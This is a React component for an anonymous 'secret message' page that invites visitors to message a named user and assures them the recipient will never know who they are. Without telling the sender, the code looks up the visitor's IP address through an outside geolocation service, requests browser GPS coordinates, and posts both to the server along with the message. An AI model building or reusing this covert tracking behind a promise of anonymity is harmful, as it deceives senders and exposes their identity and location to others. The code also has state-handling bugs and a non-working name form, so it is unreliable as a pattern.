import React from "react";
import { useState, useEffect } from "react";
import axios from "axios";
import { useDispatch } from "react-redux";
import coreimg from "../asset/img2.png";
import { useParams } from "react-router-dom";
import getUser from "../API/getAPI/getUser";
import Loader from "../components/site/loader";
import { setLoader } from "../store/features/siteControll";
import {setNoti} from "../store/features/siteControll"

function Msgbox() {
  const dispatch = useDispatch();
  const { _id } = useParams();
  console.log(_id);
  const createUser = () => {
    return true;
  };
  const [User, setUser] = useState({
    name: "",
  });
  const [Msg, setMsg] = useState({
    text: "",
    ip: "",
    location: {
      latitude: "",
      longitude: "",
    },
  });
  const [delivarySts, setDelivarySts] = useState(false);
  useEffect(() => {
    axios
      .get(`${process.env.REACT_APP_API_URL}/getuser/${_id}`)
      .then((data) => {
        console.log(data.data);
        setUser({ name: data.data.username });
        dispatch(setLoader(false));
      })
      .catch((err) => console.log(err));
  }, []);
  useEffect(() => {
    axios.get("https://geolocation-db.com/json/").then((data) => {
      setMsg({ ...Msg, ip: data.data.IPv4 });
    });
    getLocation();
    axios.get(`${process.env.REACT_APP_API_URL}/linkview/inc/${_id}`)
    .then(data=>console.log(data))
    .catch(err=> console.log(err))
  }, []);
  function getLocation() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(showPosition);
    } else {
      console.log("Geolocation is not supported by this browser.");
    }
  }

  function showPosition(position) {
    console.log(position.coords.latitude);
    console.log(position.coords.longitude);
    setMsg({
      ...Msg,
      location: {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
      },
    });
  }

  // const handleCreate = async () => {
  //   createUser("http://localhost:5000/user/create", User)
  //     .then((data) => {
  //       dispatch(saveUser({ ...data.data }));
  //       localStorage.setItem("_id", data.data._id);
  //       localStorage.setItem("authcode", data.data.authcode);
  //     })
  //     .catch((err) => console.log(err));
  // };
  async function sendMsg(event) {
    event.preventDefault();
    let url = `${process.env.REACT_APP_API_URL}/user/${_id}/sentmsg`;
    let bodyContent = {
      msgs: Msg,
    };
    axios
      .post(url, bodyContent)
      .then((data) => {
        setDelivarySts(true);
        dispatch(
          setNoti({
            msg: "Message Sent",
            tout: 1000,
            vis: true,
          }))
          setMsg({ ...Msg, text: "" });
        })
        .catch((err) => console.log(err));
      }
  return (
    <div className="text-violate w-full h-screen flex align-middle flex-col pt-5 my-10">
      <Loader status={true} />
      {delivarySts && (
        <div className="text-violate w-full flex justify-center align-middle flex-col">
          <p className="text-3xl font-semibold px-10">What's Your Name ?</p>
          <form className="px-10 flex flex-col" onSubmit={createUser}>
            <div className="textBox my-4">
              <input
                className="impBox w-full"
                type="text"
                value=""
                placeholder="Enter Your Name"
                required
              />
            </div>
            <div className="startBtn">
              <button className="btn bg-violate text-white">Create</button>
            </div>
          </form>
          <span>OR</span>
        </div>
      )}
      <p className="text-5xl font-semibold px-9 my-2">Hey,</p>
      <p className="text-3xl font-semibold px-9">
        Send {User.name} Your Secret Message here
      </p>
      <form className="px-10 flex flex-col" onSubmit={sendMsg}>
        <div className="sndmsg my-4 relative">
          <textarea
            className="parabox w-full"
            rows="8"
            value={Msg.text}
            onChange={(e) => setMsg({ ...Msg, text: e.target.value })}
          ></textarea>
          <p className="absolute bottom-2 right-2">{Msg.text.length}/1000</p>
        </div>
        <span>
          We ensure you , that {User.name} will naver know who you are{" "}
        </span>
        <input
          type="submit"
          className="btn bg-violate text-white"
          value="Send The Secret Message"
          required
        />
      </form>
    </div>
  );
}

export default Msgbox;
